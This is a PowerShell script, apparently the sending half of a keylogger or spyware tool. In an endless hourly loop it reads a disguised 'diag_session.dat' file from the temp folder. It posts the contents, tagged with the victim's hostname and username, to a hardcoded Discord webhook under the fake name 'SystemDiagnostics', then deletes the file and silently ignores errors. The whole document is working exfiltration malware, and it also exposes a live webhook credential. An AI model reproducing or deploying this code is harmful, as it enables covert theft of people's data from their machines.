# SCRIPT: sender.ps1
# --- For authorized use only ---

# Configuration
$logFile = Join-Path $env:TEMP "diag_session.dat"
$sendIntervalSeconds = 3600

# Discord Webhook
$webhookUrl = "https://discord.com/api/webhooks/1393821924471214201/nKErZsZBJOx0PJLsxhr9sWGgcEi23rNSnRtFqO_8SIWlfOvWo8ys759uLUIrHqjFzCz4"

# Main loop
while ($true) {
    try {
        Start-Sleep -Seconds $sendIntervalSeconds

        if ((Test-Path $logFile -PathType Leaf) -and ((Get-Item $logFile).Length -gt 0)) {
            $logContent = Get-Content -Path $logFile -Raw
            $hostname = $env:COMPUTERNAME
            $username = $env:USERNAME
            $timestamp = Get-Date -Format 's'

            $messageContent = $logContent.Substring(0, [Math]::Min($logContent.Length, 1800))
            $message = "Log from $hostname\$username at $timestamp $messageContent"

            $payloadObject = @{
                username = 'SystemDiagnostics'
                content  = $message
            }

            $payload = $payloadObject | ConvertTo-Json -Depth 3

            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload -ErrorAction Stop

            Remove-Item -Path $logFile -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        continue
    }
}